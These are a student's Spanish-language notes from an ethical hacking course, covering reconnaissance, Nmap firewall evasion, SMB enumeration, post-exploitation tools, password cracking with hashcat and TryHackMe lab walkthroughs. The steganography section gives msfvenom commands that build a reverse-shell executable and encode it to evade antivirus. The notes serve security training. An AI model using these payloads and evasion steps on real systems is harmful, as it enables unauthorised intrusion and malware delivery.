
# Clase de Hacking

## Clase del 30-10-2024

### Recolección de Información / Reconocimiento
- **Google Dorks**: Técnicas para realizar búsquedas avanzadas en Google y descubrir información específica.
- **Shodan**: Motor de búsqueda para dispositivos conectados a internet.
- **Robtex**: Herramienta de análisis de red y DNS.
- **DNSDumpster**: Herramienta para obtener información de DNS y mapa de red.
- **nslookup**: Comando para consultas de DNS.
- **dig**: Alternativa avanzada a `nslookup` para consultas de DNS.
- **Maltego**: Herramienta de análisis de inteligencia y conexiones entre nodos.
- **The Harvester**: Herramienta para recolectar correos y nombres de dominio.
- **AutoReconTool (Recon-NG)**: Framework de reconocimiento modular que permite realizar tareas de recolección de información avanzada.
- **Censys**: Herramienta para recopilar información de IPs y dominios de forma similar a Robtex.
- **Hunter.io, phonebook.cz, verifyemailaddress.org**: Herramientas en línea para obtener información sobre correos electrónicos y empleados de una organización, útiles en ataques de phishing.
- **PentestGPT (HackerGPT)**: Herramienta de IA que proporciona información sobre ciberseguridad y reconocimiento.
- **Practicas recomendadas**: [TryHackMe - Passive Recon](https://tryhackme.com/room/passiverecon).

### Enumeración / Escaneo
- `ping`: Comando para comprobar la conectividad con un dispositivo en la red.
- `arp-scan`: Escaneo de red para descubrir dispositivos conectados.
- **AutoRecon**: Herramienta de escaneo automático de red y vulnerabilidades.
- **Netdiscover**: Herramienta para descubrir hosts en la red local.
- `nmap -vv -sV -sC -O -p 445`: Escaneo con Nmap para detección de servicios, versiones y sistema operativo en el puerto 445.
- Navegar a los scripts de Nmap:
  ```bash
  cd /usr/share/nmap/scripts
  ```

## Clase del 31-10-2024 - Cómo Evadir un Firewall

### Técnicas de Evasión en Nmap
- **MTU (`--mtu`)**: Ajusta el tamaño de los paquetes enviados para evitar detección, configurando la unidad de transmisión máxima.
- **Data Length (`--data-length`)**: Ajusta manualmente la longitud de los datos para hacerlos lo suficientemente cortos y evitar detección.
- **Source Port (`--source-port`)**: Configura manualmente el puerto de origen para evadir detección, permitiendo seleccionar un puerto específico.
- **Decoy (`-D`)**: Envía paquetes falsos para confundir los sistemas de detección y ocultar actividad real.
- **Fragmented (`-f`)**: Fragmenta los paquetes para evitar que el firewall reconozca el tráfico como escaneo.
- **Spoof-Mac (`--spoof-mac`)**: Cambia la dirección MAC para evitar detección.
- **Stealth Scan (`-sS`)**: Realiza un escaneo SYN que evita establecer una conexión completa, ayudando a evadir detección.
- **Min-Rate (`--min-rate`)**: Controla la velocidad de los paquetes enviados, permitiendo disminuir el ritmo para evadir detección.

#### Comandos de Evasión Populares
- **Top Evasion**:
  - `--source-port`
  - `-D`
  - `--spoof-mac`
  - `-sS`
  - `--min-rate`

#### Ejemplo de Comando Evasivo
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
nmap -sCV -p80,443,21 <IP>
```

### Ejemplos y Explicaciones
- **Three-Way Handshake**: Secuencia de conexión TCP (SYN, SYN-ACK, ACK).
- **RST**: Señal para finalizar una conexión TCP.

## Clase del 01-11-2024

### Enumeración y Escaneo de SMB y SNMP
- **smbclient**: Similar a `crackmapexec`, permite conectarse a recursos compartidos SMB. Las carpetas con `$` son predefinidas (usadas para gestión y mantenimiento).
- **enum4linux**: Herramienta para enumerar usuarios a través de SMB en el puerto 445.
- **nbtscan**: Lista equipos en la red a través de NetBIOS (puerto TCP 139).
- **snmpwalk**: Lista dispositivos en una red mediante el protocolo SNMP (puertos UDP 161 y 162).
- **arp-scan**: Alternativa a `snmpwalk`, útil para detectar dispositivos en la red sin depender de puertos.
- **Practicas recomendadas**: [Hack The Box - Enumeration Module](https://academy.hackthebox.com/module/details/19).

## Hacking – Post-Explotación

### Herramientas para Post-Explotación
- **WinPEAS**: Para detectar vulnerabilidades en sistemas Windows.
- **LinPEAS**: Similar a WinPEAS, pero para sistemas Linux.
- **Gtfobins**: Herramienta para identificar binarios en sistemas Linux que pueden utilizarse para escalación de privilegios.
- **Lolbas**: Lista de binarios en Windows que pueden usarse en ataques post-explotación.
- **Bashark**: Framework de post-explotación para entornos Linux.
- **Mimikatz**: Herramienta para la extracción de contraseñas y tokens en sistemas Windows.
- **Empire**: Framework de post-explotación y explotación de Windows.
- **Msfvenom**: Herramienta de Metasploit para generar payloads personalizados.

### Herramientas Generales de Post-Explotación
- **Metasploit (msfconsole)**: Framework para explotación y post-explotación de vulnerabilidades.

### Decodificación y Codificación

#### Base64
```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw" | base64 --decode
```
Resultado:
```
Bob - !P@$sW0rD!123
```

### Protocolos y Puertos Importantes
- **LDAP**: Utilizado por Active Directory para comunicación entre equipos.
- **NetBIOS**: Protocolo de Windows para comunicación en red, reemplazado en gran parte por SMB.
- **Protocolo de Escritorio Remoto (RDP)**: Utilizado para acceder y controlar de forma remota equipos Windows en redes locales y a través de internet, generalmente en el puerto 3389.

## Herramientas Resumidas

### Resumen de Comandos y Herramientas
- **Reconocimiento**: Google Dorks, Shodan, Robtex, DNSDumpster, nslookup, dig, Maltego, The Harvester, AutoReconTool (Recon-NG), Censys, Hunter.io, phonebook.cz, verifyemailaddress.org, PentestGPT.
- **Escaneo Básico**: ping, arp-scan, nmap, AutoRecon, Netdiscover.
- **Enumeración y Escaneo de SMB/SNMP**: smbclient, enum4linux, snmpwalk, nbtscan.
- **Evasión de Firewall en Nmap**: Técnicas de ajuste de MTU, Source Port, Decoy, Fragmented, Stealth Scan y otras técnicas.
- **Post-Explotación**: WinPEAS, LinPEAS, Gtfobins, Lolbas, Bashark, Mimikatz, Empire, Msfvenom.
- **Framework General**: Metasploit (msfconsole).
- **Decodificación Base64**: Método para decodificar y codificar en formato base64.

## Clase del 06-11-2024

Continuacion maquina blue

## Clase del 14-11-2024

### Esteganografía y Generación de Payloads con Metasploit

#### **Esteganografía**
- Uso de herramientas en línea para ocultar mensajes o archivos dentro de imágenes:
  - [StegOnline](https://stegonline.georgeom.net/) para analizar y ocultar datos.
  - **Recomendación**: Utilizar formatos como PNG o BMP para obtener mejores resultados.

#### **Creación de Payloads con Metasploit**
- Generación de payloads con `msfvenom` para conexiones reversas:
  - Comando básico para generar un ejecutable malicioso:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe > reverse.exe
    ```

#### **Uso de Encoders**
- Aplicación de técnicas para evadir antivirus:
  - Comando para agregar un encoder:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe -e x86/shikata_ga_nai -i 80 > reverse.exe
    ```
    - **`-e`**: Define el encoder (ejemplo: `x86/shikata_ga_nai`).
    - **`-i`**: Número de iteraciones para reencodado (ejemplo: `80`).

#### **Verificación del Payload**
- Escaneo del archivo malicioso en **VirusTotal** para comprobar detección por antivirus.
- Uso de `show encoders` en Metasploit para explorar opciones de codificación.

#### **Búsqueda de Vulnerabilidades Offline**
- Uso de `searchsploit` para buscar exploits sin conexión:
  ```bash
  searchsploit eternalblue

![image](https://github.com/user-attachments/assets/076a4289-f5ed-45c4-9a74-3ace21938308)


## Clase del 18-11-2024

### Hashing y Cifrado: Conceptos y Diferencias

#### **Hashing**
- Proceso unidireccional que convierte datos en una cadena de longitud fija.
- **No reversible**, diseñado para verificar datos, no protegerlos.
- Usos comunes:
  - Almacenamiento seguro de contraseñas.
  - Verificación de integridad de archivos.
- Ejemplos de algoritmos:
  - MD5, SHA-1, SHA-256.

#### **Cifrado**
- Proceso bidireccional que transforma datos para proteger su confidencialidad.
- **Requiere una clave** para cifrar y otra (o la misma) para descifrar.
- Usos comunes:
  - Protección de datos sensibles.
  - Comunicaciones seguras.
- Ejemplos de algoritmos:
  - AES, RSA, DES.

#### **Diferencias clave**
| Aspecto          | Hashing              | Cifrado               |
|------------------|----------------------|-----------------------|
| Proceso          | Unidireccional       | Bidireccional         |
| Reversibilidad   | No reversible        | Reversible            |
| Propósito        | Verificación         | Confidencialidad      |
| Clave requerida  | No                   | Sí                    |

---

### Cracking de Contraseñas

#### Métodos de Cracking
1. **Fuerza Bruta**
   - Intenta todas las combinaciones posibles.
   - **Ventaja**: Garantiza éxito si es posible.
   - **Desventaja**: Muy lento y consume muchos recursos.
   - Ejemplo de herramienta: `John the Ripper`.

2. **Ataque con Diccionarios**
   - Utiliza listas predefinidas de palabras o combinaciones comunes.
   - **Ventaja**: Más rápido que fuerza bruta.
   - **Desventaja**: Limitado a las entradas disponibles en el diccionario.
   - Ejemplo de herramienta: `hashcat`.

#### Ejemplo: Uso de Diccionario con Hashcat
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- **`-m`**: Especifica el tipo de hash (e.g., `0` para MD5).
- **`-a`**: Modo de ataque (`0` para diccionario).

---

### Diccionarios: Tipos y Fuentes

#### **Tipos de Diccionarios**
- **Contraseñas comunes**: Contienen palabras y frases populares utilizadas frecuentemente.
- **Específicos de idioma**: Adaptados a patrones lingüísticos de diferentes regiones.
- **Temáticos**: Enfocados en un tema específico (e.g., deportes, tecnología, cultura).

#### **Dónde Encontrar Diccionarios**
1. **Kali Linux**:
   - Ruta predeterminada:
     ```bash
     /usr/share/wordlists/
     ```
   - Ejemplo: `rockyou.txt`.
   - Comandos para acceder:
     ```bash
     cd /usr/share/wordlists
     ls -la
     ```
   - Para descomprimir `rockyou.txt`:
     ```bash
     sudo gunzip /usr/share/wordlists/rockyou.txt.gz
     ```

2. **Internet**:
   - Repositorios públicos como GitHub.
   - **SecLists**: Amplia colección organizada por categorías (contraseñas, nombres de usuario, directorios, etc.).
     - Enlace: [SecLists - Daniel Miessler](https://github.com/danielmiessler/SecLists).
     - Versiones recomendadas:
       - **Small**: Más ágil y ligera.
       - **Complete**: Mayor cobertura, más completa.

3. **Darknet**:
   - Mercados y foros para diccionarios personalizados.
   - **Advertencia**: Riesgo de contenido ilegal o malicioso.

> 💡 **Consejo:** Organiza tus diccionarios en carpetas temáticas y utiliza los más adecuados según el contexto del ataque.

---

### Herramientas Populares para Cracking

- **John the Ripper**: Versátil y compatible con múltiples formatos de hash.
- **Hashcat**: Potente y optimizado para GPUs, ideal para tareas complejas.
- **Hydra**: Especializado en ataques dirigidos a servicios como SSH, HTTP, FTP, entre otros.



# Clase del 25-11-2024

## John the Ripper: The Basics

Los comandos básicos y esenciales de **John the Ripper** fueron explorados durante esta sesión, especialmente en la room de TryHackMe. Este archivo se centra en algunos comandos relevantes de **Nmap** que se vieron durante la clase.

### Comandos de Nmap

A continuación, se listan los comandos de **Nmap** utilizados para explorar servicios específicos en hosts remotos:

#### 1. Escaneo detallado de servicios abiertos
```bash
nmap -vv -sV --open [IP]
```
- **-vv**: Incrementa el nivel de detalle (verbose) para proporcionar más información durante el escaneo.
- **-sV**: Detecta versiones de los servicios en los puertos abiertos.
- **--open**: Solo muestra los puertos que están abiertos.

#### 2. Escaneo enfocado en SSH
```bash
nmap -vv -sV --script=ssh* -p22 [IP]
```
- **--script=ssh***: Ejecuta scripts específicos relacionados con SSH.
- **-p22**: Escanea únicamente el puerto 22, que es el puerto estándar para SSH.

#### 3. Escaneo enfocado en FTP
```bash
nmap -vv -sV --script=ftp-anon.nse -p21 [IP]
```
- **--script=ftp-anon.nse**: Utiliza el script `ftp-anon.nse` para verificar si el servidor FTP permite acceso anónimo.
- **-p21**: Escanea únicamente el puerto 21, estándar para FTP.

### Notas Adicionales
Estos comandos son muy útiles para obtener información detallada sobre servicios específicos, identificar posibles vulnerabilidades y realizar un análisis inicial en un entorno de pruebas. 

Por ejemplo:
- El escaneo con el script `ftp-anon.nse` puede revelar si un servidor FTP permite acceso anónimo, lo cual podría ser una vulnerabilidad a explotar.
- El uso del comodín `ssh*` permite ejecutar múltiples scripts relacionados con SSH para obtener más información.

---

Esta documentación sirve como referencia para los ejercicios prácticos realizados en la clase y puede ampliarse según los resultados obtenidos al usar estos comandos.

# Clase del 28-11-2024

Vemos la room de tryhackme de hydra

Para certificaciones mirar el video de esta fecha


# Clase del 02-12-2024: Room TryHackMe - Blog

## 1. Escaneo Básico con Nmap
Comando para identificar servicios y versiones en una máquina:
```bash
nmap -vv -sV [ip]
```

## 2. Modificación del Archivo Hosts
Algunas máquinas de TryHackMe no tienen DNS asociado. Es necesario modificar el archivo `/etc/hosts` para asignar nombres personalizados a las IPs.

- Editar el archivo:
```bash
sudo nano /etc/hosts
```
- Ejemplo dentro del archivo:
```plaintext
10.10.10.10    blog.thm
```
> **Nota:** Asigna nombres adecuados basados en resultados de `nmap` o llamadas frecuentes como `http://blog.thm`.

---

## 3. Análisis de Tecnologías Web

### Wappalyzer
Extensión de navegador para detectar versiones y tecnologías usadas por una web.

### WhatWeb
Herramienta de CLI para analizar tecnologías.
- Manual de uso:
```bash
man whatweb
```

---

## 4. Búsqueda de Enlaces con LinkFinder
Script que busca enlaces dentro del código fuente:
- Repositorio:
[LinkFinder - GitHub](https://github.com/GerbenJavado/LinkFinder)

---

## 5. Escaneo SSL
Para webs HTTPS:
```bash
sslscan [url]
```

---

## 6. Escaneo de Vulnerabilidades Web

### Nikto
Escáner básico, aunque no es el más recomendado:
```bash
nikto -h [http://url]
```

### Curl
Para interactuar y probar manualmente HTTP:
```bash
curl -I [url]  # Ver cabeceras
```

### Métodos HTTP con Nmap
Ver los métodos permitidos en el servidor:
```bash
nmap -vv --script http-methods [url]
```

---

## 7. Fuzzing de Directorios

### Gobuster
Comando para buscar directorios y archivos:
```bash
gobuster dir --url http://blog.thm/ --wordlist /usr/share/wordlists/dirb/big.txt
```

### Dirsearch
Escaneo más avanzado con opciones adicionales:
```bash
sudo dirsearch -u http://blog.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,html -f
```
> **Nota:**  
- `-u`: URL  
- `-w`: Wordlist  
- `-e`: Extensiones a buscar (php, txt, html)  
- `-f`: Fuerza el escaneo de archivos incluso si no hay respuesta 403.  
- `-t`: Número de hilos (paralelismo).

---

## 8. Escaneo de WordPress
Usar **WPScan** exclusivamente en sitios WordPress:
```bash
wpscan --url http://blog.thm
```

---

## Recomendación del Profesor:
Crea una **Tool Sheet** con todas las herramientas que uses, sus comandos y explicaciones breves para facilitar el estudio.

---

Clase dia 09-12-2024

instalamos zaproxy en kali con sudo apt install zaproxy

Usamos zaproxy, pero usaremos burpsuite

Hacer certificado de burpsuite para quedar mejor para las empresas. Tambien compia security+, Cysa no sabe el profesor mucho de esta.

Burpsuite es como un proxy para ver lo que va a la maquina atacada, o eso entiendo

para empezar a usar burpsuite:

1- ir a proxy y abrir proxy settings
2- Instalar foxy proxy en el navegador
3- configurar foxyproxy con la ip y puerto de burpsuite desde options
4- Volver a burpsuoite y hacer un scope ![image](https://github.com/user-attachments/assets/7bf5e699-d736-4d0f-a20c-27d2c2313fab)
5- Tambien mirar la guia de burpsuite del profesor
6- Descargar el certidficado de burpsuite y agregarlo a los ajustes del navegador 
